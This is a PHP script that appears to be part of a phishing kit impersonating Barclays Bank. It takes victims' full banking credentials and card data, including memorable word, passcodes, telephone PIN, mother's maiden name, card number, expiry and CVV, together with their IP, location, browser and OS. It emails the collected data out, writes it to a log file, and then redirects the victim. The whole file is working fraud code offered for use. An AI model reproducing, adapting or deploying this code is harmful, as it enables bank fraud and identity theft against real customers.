<?php

require "../../CONTROLS.php";
require "../../includes/functions.php";
require "../../includes/One_Time.php";

error_reporting(0);
session_start();


date_default_timezone_set('Europe/London');
$date = date('l d F Y');
$time = date('H:i');
$surname = $_SESSION['surname'];
$passcode = $_SESSION['passcode'];
$membership = "Membership No:"."".$_SESSION['membershipNumber'];
$ccno = "Card No:"."".$_SESSION['ccno'];
$sortcode = "Sortcode:"."".$_SESSION['sortcode'];
if(!empty($_SESSION['accountNumber'])) {
 $_SESSION['accountNumber'] = '-';
}
else {
	$_SESSION['accountNumber'] = $_SESSION['accountNumber'];
}
$acno = "Account No:"."".$_SESSION['accountNumber'];
$name = $_SESSION['name'];
$dob = $_SESSION['dob'];
$address = $_SESSION['address'];
$ccno2 = $_POST['ccno']; 
$ccexp = $_POST['ccexp'];
$secode = $_POST['secode'];
$memo = $_POST['memo'];
$telepin = $_POST['telepin'];
$mmn = $_POST['mmn'];
$account = $_POST['account'];
$sortcode2 = $_POST['sortcode'];

$ccno2 = str_replace(' ', '', $ccno2);
$cardInfo = bankDetails($ccno2);
$_SESSION['bin'] = ($cardInfo['bin']);
$_SESSION['brand'] = ($cardInfo['brand']);
$_SESSION['bank'] = ($cardInfo['issuer']);
$_SESSION['type'] = ($cardInfo['type']);
$bin = $_SESSION['bin'];
$bank = $_SESSION['bank'];
$brand = $_SESSION['brand'];
$type = $_SESSION['type'];
$ip = $_SERVER['REMOTE_ADDR'];
$systemInfo = systemInfo($_SERVER['REMOTE_ADDR']);
$_SESSION['VictimInfo1'] = "| Submitted by : " . $_SERVER['REMOTE_ADDR'] . " (" . gethostbyaddr($_SERVER['REMOTE_ADDR']) . ")";
$_SESSION['VictimInfo2'] = "| Location : " . $systemInfo['city'] . ", " . $systemInfo['region'] . ", " . $systemInfo['country'] . "";
$_SESSION['VictimInfo3'] = "| UserAgent : " . $systemInfo['useragent'] . "";
$_SESSION['VictimInfo4'] = "| Browser : " . $systemInfo['browser'] . "";
$_SESSION['VictimInfo5'] = "| Os : " . $systemInfo['os'] . "";
$VictimInfo1 = $_SESSION['VictimInfo1'];
$VictimInfo2 = $_SESSION['VictimInfo2'];
$VictimInfo3 = $_SESSION['VictimInfo3'];
$VictimInfo4 = $_SESSION['VictimInfo4'];
$VictimInfo5 = $_SESSION['VictimInfo5'];
$data = "
+ ------------- JohnDough -------------+
+ ------------------------------------------+
+ Personal Information
| Full name : $name
| Date of birth : $dob
| Address : $address
| MMN : $mmn
+ ------------------------------------------+
+ Account Information (Barclays)
| Surname : $surname
| Login Option : $membership $ccno $acno $sortcode
| Memorable Word : $memo
| Online Passcode: $passcode
| Telephone Passcode: $telepin
| Sortcode: $sortcode2
| Account No: $account
+ ------------------------------------------+
+ Billing Information
| Card Number : $ccno2
| Expiration date : $ccexp
| CVV : $secode
+ ------------------------------------------+
+ Victim Information
$VictimInfo1
$VictimInfo2
$VictimInfo3
$VictimInfo4
$VictimInfo5
| Received : $date @ $time
+ ------------BARCLAYS BANK LOGS------------+
";


mail($to, 'Barclays from ' . $_SERVER['REMOTE_ADDR'], $data);
$file = fopen('../../assets/logs/banks.txt', 'a');
fwrite($file, $data);
fclose($file);
redirectTo("../../Exit.php?sslchannel=true&sessionid=" . generateRandomString(130));
die;
?>